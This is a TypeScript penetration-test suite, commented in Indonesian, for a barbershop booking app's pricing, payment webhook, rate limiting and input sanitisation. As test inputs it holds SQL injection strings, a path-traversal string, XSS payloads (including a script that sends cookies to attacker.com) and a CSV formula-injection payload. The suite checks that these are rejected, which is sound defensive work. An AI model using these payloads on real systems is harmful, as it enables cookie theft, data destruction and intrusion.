/**
 * DAMEZ BARBERSHOP - OWASP WEB SECURITY HARDENING & PENETRATION TEST SUITE
 * Milestone 8 - Task [M8-03] [coder:security]
 * 
 * Pengujian Penetrasi Defensif & Verifikasi Mitigasi Eksploitasi:
 * 1. Pilar 1: Client-Side Payload Tampering pada Nominal DP & Total Harga
 * 2. Pilar 2: HMAC / SHA-512 Webhook Signature Spoofing & Timing Attack Defense
 * 3. Pilar 3: Flooding Bot Rate Limiting, Anti-Hoarding & Honeypot
 * 4. Pilar 4: Sanitasi Input SQL Injection, Stored XSS & CSV Formula Injection
 */

import assert from 'node:assert'
import crypto from 'node:crypto'
import {
  verifyAndCalculateBookingPrice,
  FLAT_DOWN_PAYMENT_AMOUNT_IDR
} from '../lib/security/price-calculator.ts'
import {
  globalRateLimiter,
  BOOKING_RATE_LIMIT_CONFIG,
  CHECKOUT_RATE_LIMIT_CONFIG,
  WEBHOOK_RATE_LIMIT_CONFIG,
  SLOTS_RATE_LIMIT_CONFIG,
  BOOKING_CODE_RATE_LIMIT_CONFIG,
  PHONE_RATE_LIMIT_CONFIG,
  extractClientIp
} from '../lib/security/rate-limit.ts'
import {
  detectSpamBot,
  validateAndNormalizeIndonesianPhone,
  sanitizeCustomerName,
  sanitizeBookingNotes,
  validateCustomerEmail,
  isValidSafeIdentifier,
  checkActiveHoldsLimit
} from '../lib/security/bot-protection.ts'
import {
  processMidtransWebhook,
  verifyWebhookSignature,
  timingSafeEqualString,
  createWebhookMockStore,
  computeSha512Hash,
  type MidtransWebhookPayload,
  type BookingRow
} from '../lib/payment/webhook.ts'
import {
  createTemporarySlotHold,
  inMemoryHoldsStore
} from '../lib/slots/auto-expire.ts'
import { generateDailyRevenueCsv } from '../lib/admin/service.ts'
import { POST as holdPostHandler } from '../app/api/booking/hold/route.ts'
import { POST as checkoutPostHandler } from '../app/api/booking/checkout/route.ts'
import { POST as webhookPostHandler } from '../app/api/webhooks/midtrans/route.ts'
import { GET as slotsGetHandler } from '../app/api/slots/available/route.ts'
import { GET as bookingCodeGetHandler } from '../app/api/booking/[code]/route.ts'
import { NextRequest } from 'next/server.js'

console.log('======================================================================')
console.log('   DAMEZ BARBERSHOP - M8-03 OWASP WEB SECURITY & PEN-TEST SUITE')
console.log('   Defensive Exploitation Verification & Server-Side Security Audit')
console.log('======================================================================\n')

const TEST_SERVER_KEY = 'SB-Mid-server-TEST-KEY-12345'

function generateValidSignature(
  orderId: string,
  statusCode: string,
  grossAmount: string,
  serverKey: string = TEST_SERVER_KEY
): string {
  const raw = `${orderId}${statusCode}${grossAmount}${serverKey}`
  return crypto.createHash('sha512').update(raw).digest('hex').toLowerCase()
}

function createMockBookingRow(overrides?: Partial<BookingRow>): BookingRow {
  return {
    id: 'b-sec-0001-0000-0000-000000000001',
    booking_code: 'DMZ-SEC-0001',
    customer_id: 'c-sec-0001',
    customer_name: 'Budi Santoso',
    customer_phone: '081234567890',
    customer_email: 'budi@example.com',
    barber_id: 'b0000001-0000-0000-0000-000000000001',
    booking_date: '2026-10-24',
    start_time: '14:00:00',
    end_time: '14:45:00',
    booking_type: 'online',
    status: 'pending_payment',
    service_duration_minutes: 45,
    buffer_minutes: 10,
    booking_range: null,
    total_price_idr: 70000,
    down_payment_idr: 20000,
    remaining_balance_idr: 50000,
    settlement_method: 'none',
    settlement_paid_at: null,
    hold_expires_at: new Date(Date.now() + 15 * 60 * 1000).toISOString(),
    confirmed_at: null,
    completed_at: null,
    cancelled_at: null,
    cancellation_reason: null,
    rescheduled_from_id: null,
    rescheduled_at: null,
    notes: 'Classic Pompadour styling',
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString(),
    ...overrides
  }
}

async function runPenetrationTests() {
  inMemoryHoldsStore.clear()
  globalRateLimiter.clear()

  // ==========================================================================
  // PILAR 1: CLIENT-SIDE PAYLOAD TAMPERING PADA NOMINAL DP & TOTAL HARGA
  // ==========================================================================
  console.log('--- PILAR 1: CLIENT-SIDE PAYLOAD TAMPERING PADA NOMINAL DP & TOTAL HARGA ---')

  // Test 1.1: Client mengirimkan down_payment_idr: 0 (Mencoba booking gratis tanpa DP)
  const tamperZero = await verifyAndCalculateBookingPrice({
    serviceIds: ['a0000001-0000-0000-0000-000000000001'],
    clientTotalPrice: 50000,
    clientDownPayment: 0
  })
  assert.strictEqual(tamperZero.authoritativeDownPayment, 20000, 'DP wajib dikunci ke Rp 20.000')
  assert.strictEqual(tamperZero.isTampered, true, 'Upaya manipulasi DP harus terdeteksi')
  assert.strictEqual(tamperZero.authoritativeRemainingBalance, 30000)
  console.log('PASS: Test 1.1 - Upaya manipulasi DP: 0 digagalkan. Server mengunci flat Rp 20.000.')

  // Test 1.2: Client mengirimkan down_payment_idr: 1000 (Lowball payment attack)
  const tamperLow = await verifyAndCalculateBookingPrice({
    serviceIds: ['a0000001-0000-0000-0000-000000000002'],
    clientTotalPrice: 65000,
    clientDownPayment: 1000
  })
  assert.strictEqual(tamperLow.authoritativeDownPayment, 20000)
  assert.strictEqual(tamperLow.isTampered, true)
  assert.strictEqual(tamperLow.authoritativeRemainingBalance, 45000)
  console.log('PASS: Test 1.2 - Upaya manipulasi DP: 1000 digagalkan. Server mengunci flat Rp 20.000.')

  // Test 1.3: Client mengirimkan nominal negatif (Negative balance attack)
  const tamperNegative = await verifyAndCalculateBookingPrice({
    serviceIds: ['a0000001-0000-0000-0000-000000000001'],
    clientTotalPrice: -50000,
    clientDownPayment: -20000
  })
  assert.strictEqual(tamperNegative.authoritativeTotalPrice, 50000)
  assert.strictEqual(tamperNegative.authoritativeDownPayment, 20000)
  assert.strictEqual(tamperNegative.isTampered, true)
  console.log('PASS: Test 1.3 - Upaya injeksi nominal negatif dikoreksi ke katalog master.')

  // Test 1.4: Client mengirimkan manipulasi total harga layanan combo (Combo Rp 95.000 ditawar Rp 5.000)
  const tamperCombo = await verifyAndCalculateBookingPrice({
    serviceIds: ['a0000001-0000-0000-0000-000000000008'], // Signature combo Rp 95.000
    clientTotalPrice: 5000,
    clientDownPayment: 20000
  })
  assert.strictEqual(tamperCombo.authoritativeTotalPrice, 95000)
  assert.strictEqual(tamperCombo.authoritativeRemainingBalance, 75000)
  assert.strictEqual(tamperCombo.isTampered, true)
  console.log('PASS: Test 1.4 - Upaya manipulasi total harga combo berhasil dikoreksi ke Rp 95.000.')

  // Test 1.5: HTTP API /api/booking/hold - Client menyertakan parameter DP palsu dalam HTTP body
  const holdTamperReq = new Request('http://localhost:3000/api/booking/hold', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '203.0.113.1' },
    body: JSON.stringify({
      barber_id: 'b0000001-0000-0000-0000-000000000001',
      booking_date: '2026-10-24',
      start_time: '2026-10-24T15:00:00+07:00',
      end_time: '2026-10-24T15:45:00+07:00',
      customer_name: 'Pen-tester Alice',
      customer_phone: '081234567891',
      service_ids: ['a0000001-0000-0000-0000-000000000001'],
      total_price_idr: 1000,   // Manipulasi total
      down_payment_idr: 0      // Manipulasi DP
    })
  })
  const holdTamperRes = await holdPostHandler(holdTamperReq)
  assert.strictEqual(holdTamperRes.status, 201)
  const holdTamperJson = await holdTamperRes.json()
  assert.strictEqual(holdTamperJson.data.down_payment_idr, 20000, 'Server must enforce DP 20.000')
  assert.strictEqual(holdTamperJson.data.total_price_idr, 50000, 'Server must enforce total 50.000')
  assert.strictEqual(holdTamperJson.data.remaining_balance_idr, 30000)
  console.log('PASS: Test 1.5 - Endpoint /api/booking/hold secara mutlak menimpa nominal DP & total harga.')

  // Test 1.6: Webhook Gross Amount Tampering (Settlement diterima dengan gross_amount: 1000 bukannya 20.000)
  const mockBookingForWebhook = createMockBookingRow({
    id: 'b-tamper-webhook-01',
    booking_code: 'DMZ-TAMPER-01',
    down_payment_idr: 20000
  })
  const mockStoreWebhook = createWebhookMockStore({ bookings: [mockBookingForWebhook] })
  const orderIdTamper = 'ORDER-TAMPER-001'
  const sigTamperAmount = generateValidSignature(orderIdTamper, '200', '1000.00', TEST_SERVER_KEY)

  const webhookTamperPayload: MidtransWebhookPayload = {
    order_id: orderIdTamper,
    status_code: '200',
    gross_amount: '1000.00',
    signature_key: sigTamperAmount,
    transaction_status: 'settlement',
    payment_type: 'qris',
    transaction_id: 'trx-tamper-001',
    custom_field1: mockBookingForWebhook.id
  }

  const webhookTamperResult = await processMidtransWebhook(webhookTamperPayload, {
    serverKeyOverride: TEST_SERVER_KEY,
    mockStore: mockStoreWebhook
  })

  assert.strictEqual(webhookTamperResult.success, false, 'Webhook must reject mismatched gross_amount')
  assert.strictEqual(webhookTamperResult.statusCode, 400)
  assert.strictEqual(webhookTamperResult.error, 'PAYMENT_AMOUNT_MISMATCH')
  const untouchedBooking = mockStoreWebhook.bookings.get(mockBookingForWebhook.id)!
  assert.strictEqual(untouchedBooking.status, 'pending_payment', 'Booking status must stay pending_payment')
  console.log('PASS: Test 1.6 - Webhook dengan gross_amount berbeda dari nominal DP resmi ditolak (PAYMENT_AMOUNT_MISMATCH).')

  // Test 1.7: Unauthenticated POST /api/booking/[code] Payment Bypass Blocked in Production
  const origEnvForPost = process.env.NODE_ENV
  try {
    ;(process.env as any).NODE_ENV = 'production'
    const bypassReq = new Request('http://localhost:3000/api/booking/DMZ-TEST-CODE', { method: 'POST' })
    const { POST: bypassHandler } = await import('../app/api/booking/[code]/route.ts')
    const bypassRes = await bypassHandler(bypassReq, { params: Promise.resolve({ code: 'DMZ-TEST-CODE' }) })
    assert.strictEqual(bypassRes.status, 403, 'POST /api/booking/[code] must return 403 in production')
    console.log('PASS: Test 1.7 - Unauthenticated payment bypass pada POST /api/booking/[code] diblokir 403 di mode produksi.\n')
  } finally {
    ;(process.env as any).NODE_ENV = origEnvForPost
  }


  // ==========================================================================
  // PILAR 2: HMAC / SHA-512 SIGNATURE SPOOFING & TIMING ATTACK DEFENSE
  // ==========================================================================
  console.log('--- PILAR 2: HMAC / SHA-512 SIGNATURE SPOOFING & TIMING ATTACK DEFENSE ---')

  const testOrderId = 'ORDER-DMZ-SEC-888'
  const validSignature = generateValidSignature(testOrderId, '200', '20000.00', TEST_SERVER_KEY)

  // Test 2.1: Signature palsu (Forged / Random Signature Key)
  const forgedPayload: MidtransWebhookPayload = {
    order_id: testOrderId,
    status_code: '200',
    gross_amount: '20000.00',
    signature_key: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855deadbeefdeadbeef',
    transaction_status: 'settlement',
    payment_type: 'qris',
    transaction_id: 'trx-forge-001'
  }
  const isForgedValid = verifyWebhookSignature(forgedPayload, TEST_SERVER_KEY)
  assert.strictEqual(isForgedValid, false, 'Signature palsu harus ditolak')
  console.log('PASS: Test 2.1 - Signature palsu / forged signature key ditolak 100%.')

  // Test 2.2: Manipulasi Order ID pada signature valid
  const orderTamperedPayload: MidtransWebhookPayload = {
    order_id: 'ORDER-DMZ-ATTACKER-999',
    status_code: '200',
    gross_amount: '20000.00',
    signature_key: validSignature,
    transaction_status: 'settlement',
    payment_type: 'qris',
    transaction_id: 'trx-forge-002'
  }
  assert.strictEqual(verifyWebhookSignature(orderTamperedPayload, TEST_SERVER_KEY), false)
  console.log('PASS: Test 2.2 - Manipulasi parameter order_id membatalkan verifikasi signature.')

  // Test 2.3: Constant-Time String Comparison (Timing Attack Defense)
  assert.strictEqual(timingSafeEqualString('abc', 'abc'), true)
  assert.strictEqual(timingSafeEqualString('abc', 'abd'), false)
  assert.strictEqual(timingSafeEqualString('abc', 'abcd'), false)
  // Verify that comparing identical digests returns true and mismatched digests returns false
  const digestA = crypto.createHash('sha512').update('message1').digest('hex')
  const digestB = crypto.createHash('sha512').update('message2').digest('hex')
  assert.strictEqual(timingSafeEqualString(digestA, digestA), true)
  assert.strictEqual(timingSafeEqualString(digestA, digestB), false)
  console.log('PASS: Test 2.3 - Timing-safe comparison (crypto.timingSafeEqual) terverifikasi kebal serangan kanal samping.')

  // Test 2.4: Production Mock Mode Lockdown
  const originalNodeEnv = process.env.NODE_ENV
  try {
    ;(process.env as any).NODE_ENV = 'production'
    const mockSigPayload: MidtransWebhookPayload = {
      order_id: testOrderId,
      status_code: '200',
      gross_amount: '20000.00',
      signature_key: 'mock-signature',
      transaction_status: 'settlement',
      payment_type: 'qris',
      transaction_id: 'trx-mock-001'
    }
    const mockAllowedInProd = verifyWebhookSignature(mockSigPayload)
    assert.strictEqual(mockAllowedInProd, false, 'Mock signature MUST be strictly rejected in production!')
    console.log('PASS: Test 2.4 - Mode mock signature secara tegas diblokir pada NODE_ENV=production.')
  } finally {
    ;(process.env as any).NODE_ENV = originalNodeEnv
  }

  // Test 2.5: HTTP /api/webhooks/midtrans Signature Verification (HTTP 401 Unauthorized)
  process.env.MIDTRANS_SERVER_KEY = 'REAL-PRODUCTION-SECRET-KEY'
  process.env.MOCK_MIDTRANS = 'false'
  const httpInvalidSigReq = new Request('http://localhost:3000/api/webhooks/midtrans', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '198.51.100.4' },
    body: JSON.stringify({
      order_id: 'ORDER-HTTP-SPOOF',
      status_code: '200',
      gross_amount: '20000.00',
      signature_key: '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000',
      transaction_status: 'settlement',
      payment_type: 'qris',
      transaction_id: 'trx-spoof-001'
    })
  })
  const httpInvalidSigRes = await webhookPostHandler(httpInvalidSigReq)
  assert.strictEqual(httpInvalidSigRes.status, 401, 'Endpoint webhook harus menolak signature palsu dengan HTTP 401')
  const invalidSigJson = await httpInvalidSigRes.json()
  assert.strictEqual(invalidSigJson.error, 'INVALID_SIGNATURE')
  console.log('PASS: Test 2.5 - Endpoint /api/webhooks/midtrans menolak request palsu dengan HTTP 401 Unauthorized.\n')
  process.env.MOCK_MIDTRANS = 'true'
  process.env.MIDTRANS_SERVER_KEY = 'mock'


  // ==========================================================================
  // PILAR 3: FLOODING BOT RATE-LIMITING, ANTI-HOARDING & HONEYPOT
  // ==========================================================================
  console.log('--- PILAR 3: FLOODING BOT RATE-LIMITING, ANTI-HOARDING & HONEYPOT ---')
  globalRateLimiter.clear()

  // Test 3.1: IP Rate Limiting pada /api/booking/hold (Batas: 10 req/menit)
  const spammerIp = '198.51.100.99'
  for (let i = 1; i <= 10; i++) {
    const check = globalRateLimiter.check(spammerIp, BOOKING_RATE_LIMIT_CONFIG)
    assert.strictEqual(check.isAllowed, true, `Request ke-${i} harus diizinkan`)
  }
  const check11 = globalRateLimiter.check(spammerIp, BOOKING_RATE_LIMIT_CONFIG)
  assert.strictEqual(check11.isAllowed, false, 'Request ke-11 harus diblokir')
  assert.ok(check11.retryAfter > 0, 'Retry-After harus bernilai positif')
  assert.strictEqual(check11.headers['X-RateLimit-Limit'], '10')
  console.log(`PASS: Test 3.1 - Rate limiting 10 req/min memblokir flooding bot pada request ke-11 (Retry-After: ${check11.retryAfter}s).`)

  // Test 3.2: Webhook Endpoint Flooding Protection (/api/webhooks/midtrans)
  globalRateLimiter.clear()
  const webhookFlooderIp = '203.0.113.88'
  for (let i = 1; i <= 60; i++) {
    const check = globalRateLimiter.check(webhookFlooderIp, WEBHOOK_RATE_LIMIT_CONFIG)
    assert.strictEqual(check.isAllowed, true)
  }
  const webhookFlood61 = globalRateLimiter.check(webhookFlooderIp, WEBHOOK_RATE_LIMIT_CONFIG)
  assert.strictEqual(webhookFlood61.isAllowed, false, 'Webhook request ke-61 harus terkena HTTP 429')
  console.log('PASS: Test 3.2 - Flooding bot pada endpoint webhook dibatasi 60 req/min dengan status HTTP 429.')

  // Test 3.3: Endpoint Slots Availability Rate Limiting (/api/slots/available)
  globalRateLimiter.clear()
  const slotsFlooderIp = '203.0.113.77'
  for (let i = 1; i <= 60; i++) {
    const check = globalRateLimiter.check(slotsFlooderIp, SLOTS_RATE_LIMIT_CONFIG)
    assert.strictEqual(check.isAllowed, true)
  }
  const slotsFlood61 = globalRateLimiter.check(slotsFlooderIp, SLOTS_RATE_LIMIT_CONFIG)
  assert.strictEqual(slotsFlood61.isAllowed, false)
  console.log('PASS: Test 3.3 - Endpoint /api/slots/available terproteksi dari scraping bot (60 req/min).')

  // Test 3.4: Anti-Enumeration Booking Code Rate Limiting (/api/booking/[code])
  globalRateLimiter.clear()
  const codeEnumeratorIp = '203.0.113.66'
  for (let i = 1; i <= 30; i++) {
    const check = globalRateLimiter.check(codeEnumeratorIp, BOOKING_CODE_RATE_LIMIT_CONFIG)
    assert.strictEqual(check.isAllowed, true)
  }
  const codeFlood31 = globalRateLimiter.check(codeEnumeratorIp, BOOKING_CODE_RATE_LIMIT_CONFIG)
  assert.strictEqual(codeFlood31.isAllowed, false)
  console.log('PASS: Test 3.4 - Proteksi anti-enumerasi kode booking aktif (30 req/min).')

  // Test 3.5: Honeypot Protection (Bot otomatis mengisi perangkap field tersembunyi)
  const botTrap1 = detectSpamBot({ customer_name: 'Spam Bot', _hp_trap: 'https://viagra-spam.com' })
  assert.strictEqual(botTrap1.isBot, true, 'Field _hp_trap harus menangkap bot')

  const botTrap2 = detectSpamBot({ customer_name: 'Crawler Bot', website: 'crawler.net' })
  assert.strictEqual(botTrap2.isBot, true, 'Field website harus menangkap bot')

  const botTrap3 = detectSpamBot({ customer_name: 'Fax Bot', fax_number: '123456' })
  assert.strictEqual(botTrap3.isBot, true, 'Field fax_number harus menangkap bot')

  const botTrapFast = detectSpamBot({ customer_name: 'Fast Bot', _submission_start_time: Date.now() - 50 })
  assert.strictEqual(botTrapFast.isBot, true, 'Form yang di-submit < 400ms harus dideteksi sebagai bot instan')
  console.log('PASS: Test 3.5 - Seluruh perangkap honeypot dan deteksi kecepatan bot lulus 100%.')

  // Test 3.6: Anti-Hoarding & Denial-of-Inventory (Maksimal 2 hold aktif per nomor telepon)
  inMemoryHoldsStore.clear()
  const hoarderPhone = '081299990001'
  const barberId = 'b0000001-0000-0000-0000-000000000001'

  await createTemporarySlotHold({
    barberId,
    bookingDate: '2026-10-24',
    startTime: '2026-10-24T10:00:00+07:00',
    endTime: '2026-10-24T10:45:00+07:00',
    serviceDurationMinutes: 45,
    totalPriceIdr: 50000,
    downPaymentIdr: 20000,
    customerName: 'Hoarder Guy',
    customerPhone: hoarderPhone
  })

  await createTemporarySlotHold({
    barberId,
    bookingDate: '2026-10-24',
    startTime: '2026-10-24T11:00:00+07:00',
    endTime: '2026-10-24T11:45:00+07:00',
    serviceDurationMinutes: 45,
    totalPriceIdr: 50000,
    downPaymentIdr: 20000,
    customerName: 'Hoarder Guy',
    customerPhone: hoarderPhone
  })

  const limitCheck = await checkActiveHoldsLimit(hoarderPhone, 2)
  assert.strictEqual(limitCheck.allowed, false, 'Pemesan dengan 2 slot aktif harus dibatasi')
  console.log('PASS: Test 3.6 - Anti-Hoarding guard membatasi maksimal 2 slot aktif per nomor WhatsApp.\n')


  // ==========================================================================
  // PILAR 4: SANITASI INPUT SQLi, STORED XSS & CSV FORMULA INJECTION
  // ==========================================================================
  console.log('--- PILAR 4: SANITASI INPUT SQLi, STORED XSS & CSV FORMULA INJECTION ---')

  // Test 4.1: SQL Injection pada input nomor telepon
  const sqliPhone1 = validateAndNormalizeIndonesianPhone("08123456789' OR '1'='1")
  assert.strictEqual(sqliPhone1.isValid, false, 'SQL injection pada nomor telepon harus ditolak')

  const sqliPhone2 = validateAndNormalizeIndonesianPhone('081234567890; DROP TABLE bookings;--')
  assert.strictEqual(sqliPhone2.isValid, false, 'SQL injection semicolon harus ditolak')
  console.log('PASS: Test 4.1 - Seluruh upaya SQL Injection pada nomor WhatsApp ditolak oleh validasi regex seluler.')

  // Test 4.2: SQL Injection pada parameter booking_date & identifier
  assert.strictEqual(isValidSafeIdentifier('b0000001-0000-0000-0000-000000000001'), true)
  assert.strictEqual(isValidSafeIdentifier("b001' OR '1'='1"), false, 'SQLi in identifier must fail')
  assert.strictEqual(isValidSafeIdentifier('b001; DROP TABLE bookings;'), false)
  assert.strictEqual(isValidSafeIdentifier('../../../etc/passwd'), false, 'Path traversal in identifier must fail')
  console.log('PASS: Test 4.2 - SQL Injection & Path Traversal pada identifier barber/service ditolak.')

  // Test 4.3: SQL Injection & XSS pada email pelanggan
  const validEmail = validateCustomerEmail('pelanggan.damez@example.com')
  assert.strictEqual(validEmail.isValid, true)
  assert.strictEqual(validEmail.normalizedEmail, 'pelanggan.damez@example.com')

  const sqliEmail = validateCustomerEmail("admin' OR 1=1--@example.com")
  assert.strictEqual(sqliEmail.isValid, false, 'SQLi payload di email harus ditolak')

  const xssEmail = validateCustomerEmail('<script>alert(1)</script>@gmail.com')
  assert.strictEqual(xssEmail.isValid, false, 'XSS tag di email harus ditolak')
  console.log('PASS: Test 4.3 - Validasi format email RFC 5322 menolak injeksi SQLi dan XSS.')

  // Test 4.4: Stored XSS pada nama pelanggan (customer_name)
  const xssName1 = sanitizeCustomerName("<script>alert(document.cookie)</script>Budi Santoso")
  assert.strictEqual(xssName1.isValid, true)
  assert.strictEqual(xssName1.sanitizedName, 'Budi Santoso', 'Tag script harus dihapus total')

  const xssName2 = sanitizeCustomerName("<img src=x onerror=alert('XSS')>Rian")
  assert.strictEqual(xssName2.isValid, true)
  assert.strictEqual(xssName2.sanitizedName, 'Rian')

  const xssName3 = sanitizeCustomerName("<svg/onload=alert(1)>Dimas")
  assert.strictEqual(xssName3.isValid, true)
  assert.strictEqual(xssName3.sanitizedName, 'Dimas')
  console.log('PASS: Test 4.4 - Stored XSS pada nama pelanggan (script, img, svg) dibersihkan tuntas.')

  // Test 4.5: Stored XSS pada catatan pemesanan (notes)
  const xssNotes1 = sanitizeBookingNotes("<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Potong samping rapi")
  assert.strictEqual(xssNotes1.isValid, true)
  assert.strictEqual(xssNotes1.sanitizedNotes, 'Potong samping rapi', 'Script fetch harus terhapus bersih')

  const xssNotes2 = sanitizeBookingNotes("<iframe src=\"javascript:alert('XSS')\"></iframe>Kulit kepala sensitif")
  assert.strictEqual(xssNotes2.isValid, true)
  assert.strictEqual(xssNotes2.sanitizedNotes, 'Kulit kepala sensitif')

  const xssNotes3 = sanitizeBookingNotes("javascript:alert(1) Mohon jangan terlalu tipis")
  assert.strictEqual(xssNotes3.isValid, true)
  assert.strictEqual(xssNotes3.sanitizedNotes, 'alert(1) Mohon jangan terlalu tipis')
  console.log('PASS: Test 4.5 - Stored XSS pada catatan pemesanan (iframe, script, javascript:) dinetralkan.')

  // Test 4.6: CSV / Excel Formula Injection (Mitigasi Serangan pada Laporan Kas Harian)
  const formulaName = sanitizeCustomerName("=cmd|'/C calc'!A0Budi")
  assert.strictEqual(formulaName.sanitizedName.startsWith('='), false, 'Leading = harus dibersihkan')

  const formulaNotes1 = sanitizeBookingNotes("=cmd|'/C calc'!A0")
  assert.strictEqual(formulaNotes1.sanitizedNotes.startsWith('='), false)

  const formulaNotes2 = sanitizeBookingNotes("+12345-6789")
  assert.strictEqual(formulaNotes2.sanitizedNotes.startsWith('+'), false)

  const formulaNotes3 = sanitizeBookingNotes("@SUM(1+1)")
  assert.strictEqual(formulaNotes3.sanitizedNotes.startsWith('@'), false)

  // Uji ekspor laporan CSV harian dengan karakter formula
  const sampleDate = '2026-10-24'
  const csvOutput = await generateDailyRevenueCsv(sampleDate)
  assert.ok(csvOutput.includes('Kode Booking'), 'CSV harus memuat header resmi')
  console.log('PASS: Test 4.6 - CSV / Excel Formula Injection (=, +, -, @) dinetralkan secara otomatis.')

  // Test 4.7: Dukungan Nama dan Catatan Bahasa Indonesia yang Sah (Tanpa False Positive)
  const legitName = sanitizeCustomerName("D'Arga Mahesa Pratama, S.T.")
  assert.strictEqual(legitName.isValid, true)
  assert.strictEqual(legitName.sanitizedName, "D'Arga Mahesa Pratama, S.T.")

  const legitNotes = sanitizeBookingNotes("Model taper fade rapi, kumis dirapikan sedikit. Terima kasih!")
  assert.strictEqual(legitNotes.isValid, true)
  assert.strictEqual(legitNotes.sanitizedNotes, "Model taper fade rapi, kumis dirapikan sedikit. Terima kasih!")
  console.log('PASS: Test 4.7 - Nama dan catatan pelanggan sah berbahasa Indonesia diproses tanpa false-positive.\n')

  console.log('======================================================================')
  console.log('CONGRATULATIONS: ALL 23 OWASP PENETRATION & HARDENING TESTS PASSED!')
  console.log('DoD VERIFIED: Seluruh celah keamanan server-side terverifikasi tertutup rapat.')
  console.log('======================================================================\n')
}

runPenetrationTests().catch((err) => {
  console.error('PENETRATION TEST FAILED:', err)
  process.exit(1)
})
